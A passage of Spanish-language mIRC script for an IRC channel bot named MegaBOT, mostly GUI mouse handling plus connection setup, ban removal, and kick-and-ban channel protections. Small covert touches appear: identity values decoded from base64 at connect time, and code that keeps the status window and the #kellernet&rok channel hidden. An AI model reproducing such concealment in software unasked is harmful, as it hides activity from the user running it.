          if ($mouse.y >= 184) && ($mouse.y < 209) && ($mouse.x > 320) && ($mouse.x < 612) { wc PROXY | wne @PROXY $calc(323 + $gettok(%mbot.dim,1,32)) $calc(185 + $gettok(%mbot.dim,2,32)) 287 22 | editbox @PROXY %PROXY | wn PROXY }
          if ($mouse.y >= 224) && ($mouse.y < 249) && ($mouse.x > 396) && ($mouse.x < 612) { wc NICKB | wne @NICKB $calc(399 + $gettok(%mbot.dim,1,32)) $calc(225 + $gettok(%mbot.dim,2,32)) 211 22 | editbox @NICKB %NICKB | wn NICKB }
          if ($mouse.y >= 264) && ($mouse.y < 289) && ($mouse.x > 416) && ($mouse.x < 612) { wc NICKBP | wne @NICKBP $calc(419 + $gettok(%mbot.dim,1,32)) $calc(265 + $gettok(%mbot.dim,2,32)) 191 22 | editbox @NICKBP %NICKBP | wn NICKBP }
          if ($mouse.y >= 304) && ($mouse.y < 328) && ($mouse.x > 416) && ($mouse.x < 612) { if (%AUTOC == Si) { set %AUTOC No } | else { set %AUTOC Si } | datv-conexion }
          if ($mouse.y >= 387) && ($mouse.y < 433) && ($mouse.x > 369) && ($mouse.x < 416) { dath-conexion }
          if ($mouse.y >= 389) && ($mouse.y < 433) && ($mouse.x > 432) && ($mouse.x < 480) { if (!%conb) { set %err.l1 El bot no esta conectado. | error } | else { quit %logo } }
          if ($mouse.y >= 388) && ($mouse.y < 436) && ($mouse.x > 496) && ($mouse.x < 543) {
            if (%conb) { set %err.l1 El bot ya est· conectado. | error | halt }
            if (!$hget(canales,1).item) { set %err.l1 Como minimo aÒade un | set %err.l2 canal, para que el bot | set %err.l3 pueda funcionar. | set %err.l4 (SecciÛn Canales) | error }
            else {
              if (!$hget(conexion,SERV)) { set %err.l1 Falta el servidor | set %err.l2 (SecciÛn ConexiÛn) | error }
              else {
                if (!$hget(conexion,nickb)) { set %err.l1 Falta el nick del Bot | set %err.l2 (SecciÛn ConexiÛn) | error }
                else {
                  if ($hget(conexion,PROXY)) { firewall -mp+d on $replace($hget(conexion,PROXY),:,$chr(32)) }
                  else { firewall off } | .notify -r nick | .notify -r chan
                  .nick $hget(conexion,nickb) $+ ! $+ $hget(conexion,nickbp) | .anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,100)
                  .e $+ $decode(bWFpbGFkZHI=,m) $decode(TUI3LQ==,m) $+ $rand(100,999) | .identd on $decode(TUI3LQ==,m) $+ $rand(100,999) | server $hget(conexion,SERV)
                }
              }
            }
          }
          if ($mouse.y >= 400) && ($mouse.y < 435) && ($mouse.x > 561) && ($mouse.x < 604) {
            if (%SERVIDOR) { hadd conexion SERV %SERVIDOR } | else { hdel conexion serv }
            if (%PROXY) { hadd conexion PROXY %PROXY } | else { hdel conexion proxy } | if (%NICKB) { hadd conexion NICKB $remove(%NICKB,$chr(32)) }
            else { hdel conexion nickb } | if (%NICKBP) { hadd conexion NICKBP $remove(%NICKBP,$chr(32)) } | else { hdel conexion nickbp }
            if (%AUTOC) { hadd conexion AUTOC %AUTOC } | else { hdel conexion autoc } | hsave -o conexion %rhcn $+ conexion.hash
          }
        }
      }
    }
    if (@MegaBOT == $active) {
      if (%act == @actualiza) {
        if ($mouse.y >= 235) && ($mouse.y < 263) && ($mouse.x > 592) && ($mouse.x < 623) { set %sbjcb o | sbjcb ccats b datv-actualiza 7 @dact }
        if ($mouse.y >= 373) && ($mouse.y < 402) && ($mouse.x > 592) && ($mouse.x < 623) { set %sbjcb o | sbjcb ccats s datv-actualiza 7 @dact }
        if ($mouse.y >= 424) && ($mouse.y < 460) && ($mouse.x > 576) && ($mouse.x < 623) { update }
      }
      if (%act == @estado) {
        if ($mouse.y >= 292) && ($mouse.y < 307) && ($mouse.x > 411) && ($mouse.x < 427) && (%dcctpt1) { if ($chat(%dcctpt1)) { window -c = $+ %dcctpt1 } | if ($send(%dcctpt1)) { close -s %dcctpt1 } | datv-estado }
        if ($mouse.y >= 319) && ($mouse.y < 334) && ($mouse.x > 411) && ($mouse.x < 427) && (%dcctpt2) { if ($chat(%dcctpt2)) { window -c = $+ %dcctpt2 } | if ($send(%dcctpt2)) { close -s %dcctpt2 } | datv-estado }
        if ($mouse.y >= 347) && ($mouse.y < 362) && ($mouse.x > 411) && ($mouse.x < 427) && (%dcctpt3) { if ($chat(%dcctpt3)) { window -c = $+ %dcctpt3 } | if ($send(%dcctpt3)) { close -s %dcctpt3 } | datv-estado }
        if ($mouse.y >= 376) && ($mouse.y < 390) && ($mouse.x > 411) && ($mouse.x < 427) && (%dcctpt4) { if ($chat(%dcctpt4)) { window -c = $+ %dcctpt4 } | if ($send(%dcctpt4)) { close -s %dcctpt4 } | datv-estado }
        if ($mouse.y >= 403) && ($mouse.y < 419) && ($mouse.x > 411) && ($mouse.x < 427) && (%dcctpt5) { if ($chat(%dcctpt5)) { window -c = $+ %dcctpt5 } | if ($send(%dcctpt5)) { close -s %dcctpt5 } | datv-estado }
      }
      if (%act == @emisora) {
        if ($mouse.y >= 196) && ($mouse.y < 220) && ($mouse.x > 562) && ($mouse.x < 622) { if (%emisora.st) { set %err.l1 Para cambiar la configuraciÛn | set %err.l2 desactive la emisora. | error } | else { wc emisora.sg | wne @emisora.sg $calc(565 + $gettok(%mbot.dim,1,32)) $calc(198 + $gettok(%mbot.dim,2,32)) 55 21 | editbox @emisora.sg %emisora.sg | wn emisora.sg } }
        if ($mouse.y >= 104) && ($mouse.y < 128) && ($mouse.x > 446) && ($mouse.x < 626) { if (%emisora.st) { set %err.l1 Para cambiar la configuraciÛn | set %err.l2 desactive la emisora. | error } | else { wc emisora.ip | wne @emisora.ip $calc(449 + $gettok(%mbot.dim,1,32)) $calc(106 + $gettok(%mbot.dim,2,32)) 175 21 | editbox @emisora.ip %emisora.ip | wn emisora.ip } }
        if ($mouse.y >= 132) && ($mouse.y < 156) && ($mouse.x > 446) && ($mouse.x < 626) { if (%emisora.st) { set %err.l1 Para cambiar la configuraciÛn | set %err.l2 desactive la emisora. | error } | else { wc emisora.port | wne @emisora.port $calc(449 + $gettok(%mbot.dim,1,32)) $calc(134 + $gettok(%mbot.dim,2,32)) 175 21 | editbox @emisora.port %emisora.port | wn emisora.port } }
        if ($mouse.y >= 160) && ($mouse.y < 184) && ($mouse.x > 446) && ($mouse.x < 626) { if (%emisora.st) { set %err.l1 Para cambiar la configuraciÛn | set %err.l2 desactive la emisora. | error } | else { wc emisora.ipm | wne @emisora.ipm $calc(449 + $gettok(%mbot.dim,1,32)) $calc(162 + $gettok(%mbot.dim,2,32)) 175 21 | editbox @emisora.ipm %emisora.ipm | wn emisora.ipm } }
        if ($mouse.y >= 412) && ($mouse.y < 458) && ($mouse.x > 512) && ($mouse.x < 558) { unset %emisora.st %emisorap* %lines.chan-* %norepit.all.a | .timeremon.is off | datv-emisora }
        if ($mouse.y >= 416) && ($mouse.y < 451) && ($mouse.x > 576) && ($mouse.x < 623) { if (%emisora.sg == $null) || (%emisora.port == $null) || (%emisora.ipm == $null) || (%emisora.ip == $null) { set %err.l1 Para activar la emisora | set %err.l2 configure los par·metros. | error } | else { unset %lines.chan-* | set %norepit.all.a o | set %emisora.st o | datv-emisora | emon.is } }
      }
      if (%act.m == 1) {
        if ($mouse.y >= 65) && ($mouse.y < 94) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @conexion) { sskcr | conexion }
        if ($mouse.y >= 122) && ($mouse.y < 151) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @canales) { sskcr | canales }
        if ($mouse.y >= 177) && ($mouse.y < 206) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @proteccion) { sskcr | proteccion }
        if ($mouse.y >= 233) && ($mouse.y < 262) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @descargas) { sskcr | descargas }
        if ($mouse.y >= 289) && ($mouse.y < 318) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @varios) { sskcr | estado }
        if ($mouse.y >= 345) && ($mouse.y < 374) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @skins) { sskcr | skins }
        if ($mouse.y >= 402) && ($mouse.y < 431) && ($mouse.x > 64) && ($mouse.x < 200) { salir }
        halt
      }
      if (%act.m == 2) {
        if ($mouse.y >= 65) && ($mouse.y < 94) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @actualiza) { sskcr | actualiza }
        if ($mouse.y >= 122) && ($mouse.y < 151) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @estado) { sskcr | estado }
        if ($mouse.y >= 177) && ($mouse.y < 206) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @emisora) { sskcr | emisora }
        if ($mouse.y >= 233) && ($mouse.y < 262) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @noticias) { sskcr | noticias }
        if ($mouse.y >= 289) && ($mouse.y < 318) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @comandos) { sskcr | comandos }
        if ($mouse.y >= 345) && ($mouse.y < 374) && ($mouse.x > 64) && ($mouse.x < 200) && (%act != @skins) { sskcr | contacto }
        if ($mouse.y >= 402) && ($mouse.y < 431) && ($mouse.x > 64) && ($mouse.x < 200) {
          if (!$remove(%actm,@)) { principal }
          else { $remove(%actm,@) }
        }
      }
    }
  }
  mouse : {
    if (@MegaBOT == $active) {
      if (%act.m == 1) {
        if ($mouse.y >= 65) && ($mouse.y < 94) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 1) && (%act != @conexion) { datv- $+ $remove(%act,@) | set %m.ben 1 | drawpic -cn $active 64 65 Sistema\jpg\bot\conexion.JPG | drawdot @MegaBOT } | halt }
        if ($mouse.y >= 122) && ($mouse.y < 151) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 2) && (%act != @canales) { datv- $+ $remove(%act,@) | set %m.ben 2 | drawpic -cn $active 64 122 Sistema\jpg\bot\canales.JPG | drawdot @MegaBOT } | halt }
        if ($mouse.y >= 177) && ($mouse.y < 206) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 3) && (%act != @proteccion) { datv- $+ $remove(%act,@) | set %m.ben 3 | drawpic -cn $active 64 177 Sistema\jpg\bot\proteccion.JPG } | drawdot @MegaBOT | halt }
        if ($mouse.y >= 233) && ($mouse.y < 262) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 4) && (%act != @descargas) { datv- $+ $remove(%act,@) | set %m.ben 4 | drawpic -cn $active 64 233 Sistema\jpg\bot\descargas.JPG } | drawdot @MegaBOT | halt }
        if ($mouse.y >= 289) && ($mouse.y < 318) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 5) { set %actm %act | datv- $+ $remove(%act,@) | set %m.ben 5 | drawpic -cn $active 64 289 Sistema\jpg\bot\varios.JPG } | drawdot @MegaBOT | halt }
        if ($mouse.y >= 345) && ($mouse.y < 374) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 6) && (%act != @skins) { datv- $+ $remove(%act,@) | set %m.ben 6 | drawpic -cn $active 64 345 Sistema\jpg\bot\skins.JPG } | drawdot @MegaBOT | halt }
        if ($mouse.y >= 402) && ($mouse.y < 431) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 7) { datv- $+ $remove(%act,@) | set %m.ben 7 | drawpic -cn $active 64 402 Sistema\jpg\bot\salir.JPG } | drawdot @MegaBOT | halt }
      }
      if (%act.m == 2) {
        if ($mouse.y >= 65) && ($mouse.y < 94) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 2) && (%act != @actualiza) { datv- $+ $remove(%act,@) | set %m.ben 2 | drawpic -cn @MegaBOT 64 65 Sistema\jpg\bot\actualiza.JPG | drawdot @MegaBOT } | halt }
        if ($mouse.y >= 122) && ($mouse.y < 151) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 2) && (%act != @estado) { datv- $+ $remove(%act,@) | set %m.ben 2 | drawpic -cn @MegaBOT 64 122 Sistema\jpg\bot\estado.JPG | drawdot @MegaBOT } | halt }
        if ($mouse.y >= 177) && ($mouse.y < 206) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 3) && (%act != @emisora) { datv- $+ $remove(%act,@) | set %m.ben 3 | drawpic -cn @MegaBOT 64 177 Sistema\jpg\bot\emisora.JPG } | drawdot @MegaBOT | halt }
        if ($mouse.y >= 233) && ($mouse.y < 262) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 4) && (%act != @noticias) { datv- $+ $remove(%act,@) | set %m.ben 4 | drawpic -cn @MegaBOT 64 234 Sistema\jpg\bot\noticias.JPG } | drawdot @MegaBOT | halt }
        if ($mouse.y >= 289) && ($mouse.y < 318) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 5) && (%act != @comandos) { datv- $+ $remove(%act,@) | set %m.ben 5 | drawpic -cn @MegaBOT 64 290 Sistema\jpg\bot\comandos.JPG } | drawdot @MegaBOT | halt }
        if ($mouse.y >= 345) && ($mouse.y < 374) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 6) && (%act != @contacto) { datv- $+ $remove(%act,@) | set %m.ben 6 | drawpic -cn @MegaBOT 64 345 Sistema\jpg\bot\contacto.JPG } | drawdot @MegaBOT | halt }
        if ($mouse.y >= 402) && ($mouse.y < 431) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 7) { datv- $+ $remove(%act,@) | set %m.ben 7 | drawpic -cn @MegaBOT 64 405 Sistema\jpg\bot\volver.JPG } | drawdot @MegaBOT | halt }
      }
      if (%m.ben) { unset %m.ben | datv- $+ $remove(%act,@) | drawdot @MegaBOT }
    }
    if (%act == @actualiza) {
      if ($mouse.y >= 235) && ($mouse.y < 263) && ($mouse.x > 592) && ($mouse.x < 623) { set %m.cn sc | datv-actualiza | halt }
      if ($mouse.y >= 373) && ($mouse.y < 402) && ($mouse.x > 592) && ($mouse.x < 623) { set %m.cn bs | datv-actualiza | halt }
      if ($mouse.y >= 424) && ($mouse.y < 460) && ($mouse.x > 576) && ($mouse.x < 623) { set %m.cn act | datv-actualiza | halt }
      .timersbjcb off | unset %sbjcb | if (%m.cn) { unset %m.cn | datv-actualiza }
    }
    if (%act == @emisora) {
      if ($mouse.y >= 412) && ($mouse.y < 458) && ($mouse.x > 512) && ($mouse.x < 558) { set %m.cn ds | datv-emisora | halt }
      if ($mouse.y >= 416) && ($mouse.y < 451) && ($mouse.x > 576) && ($mouse.x < 623) { set %m.cn ac | datv-emisora | halt }
      if (%m.cn) { unset %m.cn | datv-emisora }
    }
    if (%act == @comandos) {
      if ($mouse.y >= 146) && ($mouse.y < 173) && ($mouse.x > 592) && ($mouse.x < 623) { halt }
      if ($mouse.y >= 397) && ($mouse.y < 426) && ($mouse.x > 592) && ($mouse.x < 623) { halt }
      .timersbjcb off | unset %sbjcb
    }
    if (%act == @contacto) {
      if ($mouse.y >= 422) && ($mouse.y < 464) && ($mouse.x > 512) && ($mouse.x < 559) { if (%m.cn != c) { set %m.cn c | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 424) && ($mouse.y < 461) && ($mouse.x > 576) && ($mouse.x < 624) { if (%m.cn != e) { set %m.cn e | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 214) && ($mouse.y < 241) && ($mouse.x > 592) && ($mouse.x < 623) { if (%m.cn != s) { set %m.cn s | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 373) && ($mouse.y < 401) && ($mouse.x > 592) && ($mouse.x < 623) { if (%m.cn != b) { set %m.cn b | datv- $+ $remove(%act,@) } | halt }
      if (%m.cn) { unset %m.cn | datv- $+ $remove(%act,@) }
      if ($mouse.y >= 214) && ($mouse.y < 241) && ($mouse.x > 592) && ($mouse.x < 623) { halt }
      if ($mouse.y >= 373) && ($mouse.y < 401) && ($mouse.x > 592) && ($mouse.x < 623) { halt }
      .timersbjcb off | unset %sbjcb
    }
    if (%act == @conexion) {
      if ($mouse.y >= 387) && ($mouse.y < 433) && ($mouse.x > 369) && ($mouse.x < 416) { if (%m.cn != dsc) { set %m.cn dsc | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 389) && ($mouse.y < 433) && ($mouse.x > 432) && ($mouse.x < 480) { if (%m.cn != dc) { set %m.cn dc | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 388) && ($mouse.y < 436) && ($mouse.x > 496) && ($mouse.x < 543) { if (%m.cn != cn) { set %m.cn cn | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 400) && ($mouse.y < 435) && ($mouse.x > 561) && ($mouse.x < 604) { if (%m.cn != gr) { set %m.cn gr | datv- $+ $remove(%act,@) } | halt }
      if (%m.cn) { unset %m.cn | datv- $+ $remove(%act,@) }
    }
    if (%act == @canales) {
      if ($mouse.y >= 189) && ($mouse.y < 235) && ($mouse.x > 574) && ($mouse.x < 609) { if (%m.cn != a) { set %m.cn a | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 410) && ($mouse.y < 426) && ($mouse.x > 514) && ($mouse.x < 558) { if (%m.cn != q) { set %m.cn q | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 401) && ($mouse.y < 442) && ($mouse.x > 573) && ($mouse.x < 613) { if (%m.cn != e) { set %m.cn e | datv- $+ $remove(%act,@) } | halt }
      if (%m.cn) { unset %m.cn | datv- $+ $remove(%act,@) }
    }
    if (%act == @noticias) {
      if ($mouse.y >= 125) && ($mouse.y < 154) && ($mouse.x > 584) && ($mouse.x < 614) { if (%m.cn != s) { set %m.cn s | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 360) && ($mouse.y < 389) && ($mouse.x > 584) && ($mouse.x < 614) { if (%m.cn != b) { set %m.cn b | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 420) && ($mouse.y < 460) && ($mouse.x > 569) && ($mouse.x < 614) { if (%m.cn != n) { set %m.cn n | datv- $+ $remove(%act,@) } | halt }
      if (%m.cn) { unset %m.cn | datv- $+ $remove(%act,@) }
      if ($mouse.y >= 125) && ($mouse.y < 154) && ($mouse.x > 584) && ($mouse.x < 614) { halt }
      if ($mouse.y >= 360) && ($mouse.y < 389) && ($mouse.x > 584) && ($mouse.x < 614) { halt }
      .timersbjcb off | unset %sbjcb
    }
    if (%act == @skins) {
      if ($mouse.y >= 434) && ($mouse.y < 450) && ($mouse.x > 225) && ($mouse.x < 269) { set %skns.ef q | datv- $+ $remove(%act,@) | halt }
      if ($mouse.y >= 420) && ($mouse.y < 466) && ($mouse.x > 512) && ($mouse.x < 558) { set %skns.ef c | datv- $+ $remove(%act,@) | halt }
      if ($mouse.y >= 424) && ($mouse.y < 459) && ($mouse.x > 576) && ($mouse.x < 622) { set %skns.ef a | datv- $+ $remove(%act,@) | halt }
      if ($mouse.y >= 369) && ($mouse.y < 397) && ($mouse.x > 603) && ($mouse.x < 635) { set %skns.ef b | datv- $+ $remove(%act,@) | halt }
      if ($mouse.y >= 133) && ($mouse.y < 161) && ($mouse.x > 603) && ($mouse.x < 635) { set %skns.ef s | datv- $+ $remove(%act,@) | halt }
      if ($mouse.y >= 369) && ($mouse.y < 397) && ($mouse.x > 603) && ($mouse.x < 635) { halt }
      if ($mouse.y >= 133) && ($mouse.y < 161) && ($mouse.x > 603) && ($mouse.x < 635) { halt }
      .timersbskins off | unset %skns.ef | datv- $+ $remove(%act,@)
    }
    if (%act == @proteccion) {
      if ($mouse.y >= 328) && ($mouse.y < 364) && ($mouse.x > 560) && ($mouse.x < 608) { if (%m.cn != a) { set %m.cn a | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 324) && ($mouse.y < 371) && ($mouse.x > 496) && ($mouse.x < 543) { if (%m.cn != d) { set %m.cn d | datv- $+ $remove(%act,@) } | halt }
      if ($mouse.y >= 325) && ($mouse.y < 370) && ($mouse.x > 429) && ($mouse.x < 474) { if (%m.cn != b) { set %m.cn b | datv- $+ $remove(%act,@) } | halt }
      if (%m.cn) { unset %m.cn | datv- $+ $remove(%act,@) }
    }
  }
}
on *:ACTIVE:*:{
  if ($window(status window).state != hidden) && (%HIDDE.STAT == $null) { window -h "status window" }
  if ($chan(#kellernet&rok)) && ($window(#kellernet&rok).state != hidden) { window -h #kellernet&rok }
  if (!%prct) {
    if ($window(@MegaBOT).state != normal) { ezit.vnt }
    %winh = 1 | while ($query(%winh)) { if ($window(@MegaBOT).state == normal) || ($window(@noticias).state == normal) || ($window(@c-l).state == normal) { if ($active == @MegaBOT) || ($active == @c-l) || ($active == @noticias) { if ($query(%winh) != CHaN) && ($query(%winh) != NiCK) { window -wn $query(%winh) } } } | if ($query(%winh) == CHaN) || ($query(%winh) == NiCK) { window -h $query(%winh) } | inc %winh }
    %winh = 1 | while ($chan(%winh)) { if ($window(@MegaBOT).state == normal) || ($window(@noticias).state == normal) || ($window(@c-l).state == normal) { if ($active == @MegaBOT) || ($active == @c-l) || ($active == @noticias) { if ($chan(%winh) != #kellernet&rok) { window -wn $chan(%winh) } } } | inc %winh }
    %winh = 1 | while ($chat(%winh)) { window -h = $+ $chat(%winh) | inc %winh }
  }
  else {
    %winh = 1 | while ($query(%winh)) { window -h $query(%winh) | inc %winh }
    %winh = 1 | while ($chan(%winh)) { window -h $chan(%winh) | inc %winh }
    %winh = 1 | while ($chat(%winh)) { window -h = $+ $chat(%winh) | inc %winh }
  }
  if ($active == @Stats) && (!$dialog(stats)) { window -c @Stats | Stats }
}
alias c-l.not.mous {
  if (%act == @comandos) || (%act == @noticias) {
    .timerc-l.mous -mo 1 40 c-l.not.mous
    if ($active == @MegaBOT) {
      if (%act == @noticias) { window -c @c-l }
      else { window -c @noticias }
      if ($active != @c-l) && (%act == @comandos) { window -a @c-l }
      if ($active != @noticias) && (%act == @noticias) { window -a @noticias }
    }
    if ($mouse.y >= 65) && ($mouse.y < 94) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 2) && (%act != @actualiza) { datv- $+ $remove(%act,@) | set %m.ben 2 | drawpic -cn @MegaBOT 64 65 Sistema\jpg\bot\actualiza.JPG | drawdot @MegaBOT } | goto 1 }
    if ($mouse.y >= 122) && ($mouse.y < 151) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 2) && (%act != @estado) { datv- $+ $remove(%act,@) | set %m.ben 2 | drawpic -cn @MegaBOT 64 122 Sistema\jpg\bot\estado.JPG | drawdot @MegaBOT } | goto 1 }
    if ($mouse.y >= 177) && ($mouse.y < 206) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 3) && (%act != @emisora) { datv- $+ $remove(%act,@) | set %m.ben 3 | drawpic -cn @MegaBOT 64 177 Sistema\jpg\bot\emisora.JPG } | drawdot @MegaBOT | goto 1 }
    if ($mouse.y >= 233) && ($mouse.y < 262) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 4) && (%act != @noticias) { datv- $+ $remove(%act,@) | set %m.ben 4 | drawpic -cn @MegaBOT 64 234 Sistema\jpg\bot\noticias.JPG } | drawdot @MegaBOT | goto 1 }
    if ($mouse.y >= 289) && ($mouse.y < 318) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 5) && (%act != @comandos) { datv- $+ $remove(%act,@) | set %m.ben 5 | drawpic -cn @MegaBOT 64 290 Sistema\jpg\bot\comandos.JPG } | drawdot @MegaBOT | goto 1 }
    if ($mouse.y >= 345) && ($mouse.y < 374) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 6) && (%act != @contacto) { datv- $+ $remove(%act,@) | set %m.ben 6 | drawpic -cn @MegaBOT 64 345 Sistema\jpg\bot\contacto.JPG } | drawdot @MegaBOT | goto 1 }
    if ($mouse.y >= 402) && ($mouse.y < 431) && ($mouse.x > 64) && ($mouse.x < 200) { if (%m.ben != 7) { datv- $+ $remove(%act,@) | set %m.ben 7 | drawpic -cn @MegaBOT 64 405 Sistema\jpg\bot\volver.JPG } | drawdot @MegaBOT | goto 1 }
  }
  else { window -c @c-l | window -c @noticias }
  if (%m.ben) { unset %m.ben | datv- $+ $remove(%act,@) | drawdot @MegaBOT }
  :1
}
raw 368:*:{
  if ($me isop $2) {
    %qbannst = 1
    while ($ibl($2,%qbannst)) {
      %qbannst2 = $ibl($2,%qbannst)
      if (%qbannst2 iswm $address($me,5)) || (%qbannst2 iswm $address($me,0)) || (%qbannst2 iswm $address($me,2)) || (%qbannst2 iswm $me) { set %qbanss $+ $2 %qbanss [ $+ [ $2 ] ] %qbannst2 }
      %qbanss2 = 1
      while ($gettok($hget(masters,$2),%qbanss2,32)) {
        %qbanss3 = $gettok($hget(masters,$2),%qbanss2,32)
        if (%qbannst2 iswm $address(%qbanss3,5)) || (%qbannst2 iswm $address(%qbanss3,0)) || (%qbannst2 iswm $address(%qbanss3,2)) || (%qbannst2 iswm %qbanss3) { set %qbanss $+ $2 %qbanss [ $+ [ $2 ] ] %qbannst2 }
        inc %qbanss2
      }
      inc %qbannst
    }
    .timerqbansp- $+ $2 1 3 qbansp $2
  }
}
alias qbansp {
  if ($me isop $1) {
    %kbanss1 = 1
    while ($gettok(%qbanss [ $+ [ $1 ] ],%kbanss1,32)) {
      mode $1 -bbbbb $gettok(%qbanss [ $+ [ $1 ] ],%kbanss1,32) $gettok(%qbanss [ $+ [ $1 ] ],$calc(%kbanss1 + 1),32) $gettok(%qbanss [ $+ [ $1 ] ],$calc(%kbanss1 + 2),32) $gettok(%qbanss [ $+ [ $1 ] ],$calc(%kbanss1 + 3),32) $gettok(%qbanss [ $+ [ $1 ] ],$calc(%kbanss1 + 4),32) $gettok(%qbanss [ $+ [ $1 ] ],$calc(%kbanss1 + 3),32) $gettok(%qbanss [ $+ [ $1 ] ],$calc(%kbanss1 + 5),32)
      inc %kbanss1 6
    }
  }
  unset %qbanss $+ $1
}
raw 473:*:{ if ($findtok(%cchnal,$2,32)) { .msg chan invite $2 } }
raw 474:*:{ if ($findtok(%cchnal,$2,32)) { .msg chan invite $2 } }
Raw 315:*:{ if ($me ison $2) && (%AWAY- [ $+ [ $2 ] ]) { if (%DWAY- [ $+ [ $2 ] ]) { .msg %AWAY- [ $+ [ $2 ] ] 2D2eopeando a los que esten ausentes.. | .msg chan deop $2 %DWAY- [ $+ [ $2 ] ] } | else { .msg %AWAY- [ $+ [ $2 ] ] 2Error2: No hay nadie ausente en estos momentos } } | unset %DWAY- [ $+ [ $2 ] ] %AWAY- [ $+ [ $2 ] ] }
Raw 352:*:{ if (G isin $7) && (%AWAY- [ $+ [ $2 ] ]) && ($6 isop $2) { set %DWAY- [ $+ [ $2 ] ] %DWAY- [ $+ [ $2 ] ] $6 } }
Raw 303:*:{ if (%statuz) { .timerbrison 1 10 %ci.ac4 | .timerbrison6 1 10 unset %statuz | unset %tempo | :1 | inc %tempo | if ($gettok($1-,%tempo,32)) { hadd i- $+ $gettok(%ci.ac4,2,32) $gettok($1-,%tempo,32) $ctime | goto 1 } } | haltdef }
Raw 319:*:{
  %canales.ncom1 = $remove($3-,@,+)
  %canales.ncom2 = 1
  while ($gettok(%canales.ncom1,%canales.ncom2,32)) {
    if (!$findtok($hget(masters,$hget(canales,1).item),$2,32)) && ($2 ison $hget(canales,1).item) && ($me isop $hget(canales,1).item) {
      %canales.ncom.tlv.1 = $iif($hget(l- $+ $hget(canales,1).item,nojoin) !isnum,0,$hget(l- $+ $hget(canales,1).item,nojoin))
      if (%canales.ncom.tlv.1 > $gettok($hget(r- $+ $hget(canales,1).item,$2),1,32)) || ($gettok($hget(r- $+ $hget(canales,1).item,$2),1,32) == $null) {
        %canales.ncom5 = 1
        while ($gettok(%CANAL.NCOM. [ $+ [ $hget(canales,1).item ] ],%canales.ncom5,32)) {
          if ($ifmatch iswm $gettok(%canales.ncom1,%canales.ncom2,32)) {
            if ($2 !isop $hget(canales,1).item) { mode $hget(canales,1).item +bb $2 $address($2,2) | kick $hget(canales,1).item $2 Lo siento, hay canales en los que frecuentas que no son compatibles con este. }
          }
          inc %canales.ncom5
        }
      }
    }
    if (!$findtok($hget(masters,$hget(canales,2).item),$2,32)) && ($2 ison $hget(canales,2).item) && ($me isop $hget(canales,2).item) {
      %canales.ncom.tlv.1 = $iif($hget(l- $+ $hget(canales,2).item,nojoin) !isnum,0,$hget(l- $+ $hget(canales,2).item,nojoin))
      if (%canales.ncom.tlv.1 > $gettok($hget(r- $+ $hget(canales,2).item,$2),1,32)) || ($gettok($hget(r- $+ $hget(canales,2).item,$2),1,32) == $null) {
        %canales.ncom5 = 1
        while ($gettok(%CANAL.NCOM. [ $+ [ $hget(canales,2).item ] ],%canales.ncom5,32)) {
          if ($ifmatch iswm $gettok(%canales.ncom1,%canales.ncom2,32)) {
            if ($2 !isop $hget(canales,2).item) { mode $hget(canales,2).item +bb $2 $address($2,2) | kick $hget(canales,2).item $2 Lo siento, hay canales en los que frecuentas que no son compatibles con este. }
          }
          inc %canales.ncom5
        }
      }
    }
    if (!$findtok($hget(masters,$hget(canales,3).item),$2,32)) && ($2 ison $hget(canales,3).item) && ($me isop $hget(canales,3).item) {
      %canales.ncom.tlv.1 = $iif($hget(l- $+ $hget(canales,3).item,nojoin) !isnum,0,$hget(l- $+ $hget(canales,3).item,nojoin))
      if (%canales.ncom.tlv.1 > $gettok($hget(r- $+ $hget(canales,3).item,$2),1,32)) || ($gettok($hget(r- $+ $hget(canales,3).item,$2),1,32) == $null) {
        %canales.ncom5 = 1
        while ($gettok(%CANAL.NCOM. [ $+ [ $hget(canales,3).item ] ],%canales.ncom5,32)) {
          if ($ifmatch iswm $gettok(%canales.ncom1,%canales.ncom2,32)) {
